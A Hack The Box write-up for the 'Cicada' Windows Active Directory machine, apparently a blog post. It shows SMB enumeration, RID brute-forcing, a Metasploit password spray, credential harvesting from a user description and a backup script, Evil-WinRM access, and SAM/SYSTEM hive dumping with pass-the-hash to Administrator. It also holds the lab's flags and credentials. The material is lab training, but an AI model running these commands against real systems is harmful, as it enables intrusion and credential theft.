@@ -1,0 +1,286 @@
+---
+title: CICADA
+date: '2024-12-31'
+description: ''
+type: writeup
+platform: hackthebox
+tags:
+  - ACTIVE MACHINE
+  - Easy
+  - HTB
+  - WINDOWS
+cover: >-
+  /mc/uploads/2025/01/a-close-up-view-of-a-cicada-on-a-branch-wz28wdjsx40m82ud.jpg
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+In this write-up, we will walk through the steps to hack the Cicada machine on Hack The Box. Let's dive in!
+
+## Initial Enumeration with Nmap
+
+```bash
+$ nmap -sV 10.10.11.35 -T5 
+> Nmap scan report for cicada.htb (10.10.11.35)
+Host is up (0.056s latency).
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-31 06:53:33Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 51.59 seconds
+```
+## Step 2: Enumeration of SMB Service
+
+we got the port 445 open is for SMB :server mail block  
+let access to it
+
+```bash
+$ smbclient   //10.10.11.35/HR -N
+Try "help" to get a list of possible commands.
+smb: > ls
+  .                                   D        0  Thu Mar 14 08:29:09 2024
+  ..                                  D        0  Thu Mar 14 08:21:29 2024
+  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024
+
+        4168447 blocks of size 4096. 61830 blocks available
+smb: > get "Notice from HR.txt" 
+getting file Notice from HR.txt of size 1266 as Notice from HR.txt (5.9 KiloBytes/sec) (average 5.9 KiloBytes/sec)
+```
+After reading the file "Notice from HR.txt", we obtained a password, but  
+we don't know which user it belongs to.
+
+```bash
+
+Dear new hire!
+
+Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.
+
+Your default password is: Cicada$M6Corpb*@Lp#nZp!8
+
+To change your password:
+....
+```
+To find the user, we can use tools like netexec or crackmapexec:
+
+```bash
+$ netexec smb 10.10.11.35 -u nutzh -p 'Cicada$M6Corpb*@Lp#nZp!8' --rid-brute 
+ SMB                      10.10.11.35     445    CICADA-DC        500: CICADAAdministrator (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        501: CICADAGuest (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        502: CICADAkrbtgt (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1000: CICADACICADA-DC$ (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1104: CICADAjohn.smoulder (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1105: CICADAsarah.dantelia (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1106: CICADAmichael.wrightson (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1108: CICADAdavid.orelious (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1601: CICADAemily.oscars (SidTypeUser)
+```
+We have a bunch of users, so let's create a text file and try the password with each user. I will use Metasploit for this and the 'scanner/smb/smb\_login' module.
+
+```bash
+$  set RHOST 10.10.11.35
+   set SMBPass Cicada$M6Corpb*@Lp#nZp!8
+   set USER_FILE /home/kali/Desktop/HTB/CICADA/user.txt
+   set Createsession True
+msf6 auxiliary(scanner/smb/smb_login) > run
+ [*] 10.10.11.35:445       - 10.10.11.35:445 - Starting SMB login bruteforce
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.Administrator:Cicada$M6Corpb*@Lp#nZp!8',
+[!] 10.10.11.35:445       - No active DB -- Credential data will not be saved!
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.Guest:Cicada$M6Corpb*@Lp#nZp!8',
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.CICADA-DC$ :Cicada$M6Corpb*@Lp#nZp!8',
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.krbtgt:Cicada$M6Corpb*@Lp#nZp!8',
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.john.smoulder:Cicada$M6Corpb*@Lp#nZp!8',
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8',
+[+] 10.10.11.35:445       - 10.10.11.35:445 - Success: '.michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8'
+[*] SMB session 1 opened (10.10.14.145:33375 -> 10.10.11.35:445) at 2024-12-30 19:15:45 -0500
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.david.orelious:Cicada$M6Corpb*@Lp#nZp!8',
+[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: '.emily.oscars:Cicada$M6Corpb*@Lp#nZp!8',
+[*] 10.10.11.35:445       - Scanned 1 of 1 hosts (100% complete)
+[*] 10.10.11.35:445       - Bruteforce completed, 1 credential was successful.
+[*] 10.10.11.35:445       - 1 SMB session was opened successfully.
+[*] Auxiliary module execution completed
+```
+After finding that the user is michael.wrightson, we can use Metasploit  
+to connect to SMB:
+
+```bash
+$ msf6 auxiliary(scanner/smb/smb_login) > sessions -i 1
+```
+While exploring, I didn't find much, but I did discover something interesting  
+with this command:
+
+```bash
+$ crackmapexec smb 10.10.11.35 -u michael.wrightson -p Cicada$M6Corpb*@Lp#nZp!8 --users
+SMB         10.10.11.35     445    CICADA-DC        cicada.htbemily.oscars                   badpwdcount: 0 desc: 
+SMB         10.10.11.35     445    CICADA-DC        cicada.htbdavid.orelious                 badpwdcount: 0 desc: Just in case I forget my password is aRt$Lp#7t*VQ!3
+SMB         10.10.11.35     445    CICADA-DC        cicada.htbmichael.wrightson              badpwdcount: 0 desc: 
+SMB         10.10.11.35     445    CICADA-DC        cicada.htbsarah.dantelia                 badpwdcount: 0 desc: 
+SMB         10.10.11.35     445    CICADA-DC        cicada.htbjohn.smoulder                  badpwdcount: 0 desc: 
+SMB         10.10.11.35     445    CICADA-DC        cicada.htbkrbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
+SMB         10.10.11.35     445    CICADA-DC        cicada.htbGuest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
+SMB         10.10.11.35     445    CICADA-DC        cicada.htbAdministrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
+```
+We find another password for david.orelious: aRt$Lp#7t\*VQ!3. So let's go back to Metasploit and create another session with these credentials:
+
+```bash
+$ SMB (10.10.11.35) > shares
+Shares
+======
+
+    #  Name      Type          comment
+    -  ----      ----          -------
+    0  ADMIN$    DISK|SPECIAL  Remote Admin
+    1  C$        DISK|SPECIAL  Default share
+    2  DEV       DISK
+    3  HR        DISK
+    4  IPC$      IPC|SPECIAL   Remote IPC
+    5  NETLOGON  DISK          Logon server share
+    6  SYSVOL    DISK          Logon server share
+SMB (10.10.11.35) > shares -i 2
+[+] Successfully connected to DEV
+SMB (10.10.11.35DEV) > ls
+ls 
+===
+
+    #  Type  Name               Created                    Accessed                   Written                    Changed                    Size
+    -  ----  ----               -------                    --------                   -------                    -------                    ----
+    0  DIR   .                  2024-03-14T08:21:29-04:00  2024-08-30T16:53:19-04:00  2024-03-14T08:31:39-04:00  2024-08-28T13:27:31-04:00
+    1  DIR   ..                 2024-03-14T08:19:24-04:00  2024-08-30T17:01:54-04:00  2024-03-14T08:21:29-04:00  2024-03-14T08:21:29-04:00
+    2  FILE  Backup_script.ps1  2024-03-14T08:31:38-04:00  2024-08-28T13:28:22-04:00  2024-08-28T13:28:22-04:00  2024-08-28T13:28:22-04:00  601
+
+SMB (10.10.11.35DEV) > Interrupt: use the 'exit' command to quit
+SMB (10.10.11.35DEV) > cat Backup_script.ps1
+
+$sourceDirectory = "C:smb"
+$destinationDirectory = "D:Backup"
+
+$username = "emily.oscars"
+$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
+$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
+$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
+$backupFileName = "smb_backup_$dateStamp.zip"
+$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
+Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
+Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
+```
+## foothold
+
+We found another password for emily.oscars: "Q!3@Lp#M6b*7t*Vt".  
+I Hope this will be the last one!😂😂
+
+From the two directories, I think we can remotely access the Windows machine.After searching on Google,I found that we can access it through port 5985 with WinRM.WinRM is essentially like SSH. We will use Evil-WinRM for this.  
+If you don't have it, you can install it with:
+
+```bash
+$ gem install evil-winrm
+```
+Now let's connect:
+
+```bash
+ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
+ Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:Usersemily.oscars.CICADADocuments>
+```
+so we are inside the target Machine so we can read the user flag
+
+```bash
+$ *Evil-WinRM* PS C:Usersemily.oscars.CICADADocuments> cd ..Desktop
+PS C:Usersemily.oscars.CICADADesktop> cat user.txt
+a2c1726fd3962d78e455d9f2dfd3c877
+```
+## Privilege Escalation
+
+Next, check privileges:
+
+```bash
+ *Evil-WinRM* PS C:Usersemily.oscars.CICADADocuments> whoami /priv
+ *Evil-WinRM* PS C:Usersemily.oscars.CICADADocuments> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
+The first two privileges (SeBackupPrivilege and SeRestorePrivilege) allow us to restore and back up files. After researching, I found that we can restore files  
+that contain hashed passwords. I tried with robocopy, but it failed, so  
+we will try the reg save command and see if it works:
+
+```bash
+ *Evil-WinRM* PS C:Usersemily.oscars.CICADADocuments> cd ..Desktop
+ *Evil-WinRM* PS C:Usersemily.oscars.CICADADesktop> reg save hklmSYSTEM .SYSTEM
+ *Evil-WinRM* PS C:Usersemily.oscars.CICADADesktop> reg save hklmSAM .SAM
+```
+After restoring these files, we can download them to our local machine:
+
+```bash
+$ *Evil-WinRM* PS C:Usersemily.oscars.CICADADesktop> download SAM & download SYSTEM
+Info: Downloading C:Usersemily.oscars.CICADADesktopSAM to SAM
+
+Info: Download successful!
+Info: Downloading C:Usersemily.oscars.CICADADesktopSYSTEM to SYSTEM
+
+Info: Download successful!
+```
+Now, let's open these files on our local machine using:
+
+```bash
+$ pypykatz registry --sam sam system
+
+WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
+WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
+============== SYSTEM hive secrets ==============
+CurrentControlSet: ControlSet001
+Boot Key: 3c2b033757a49110a9ee680b46e8d620
+============== SAM hive secrets ==============
+HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+We will now attempt to connect again with the administrator credentials:
+
+```bash
+$ evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
+
+ *Evil-WinRM* PS C:UsersAdministratorDocuments> cd ..Desktop
+ *Evil-WinRM* PS C:UsersAdministratorDesktop> ls
+
+    Directory: C:UsersAdministratorDesktop
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---        12/30/2024  11:34 PM             34 root.txt
+
+*Evil-WinRM* PS C:UsersAdministratorDesktop> cat root.txt
+c30aa073a06e50322b2f8d9a6f1ae896
+```
+CONGRATULATION🎉🎉
+
+## CONCLUSION:
+
+It was my first time pwning a Windows machine, so it was a bit complex but also fun.I learned a lot about enumerating SMB and discovered new tools like Evil-WinRM.I also gained insight into important Windows files like SAM and SYSTEM. Overall, it was a fruitful machine!
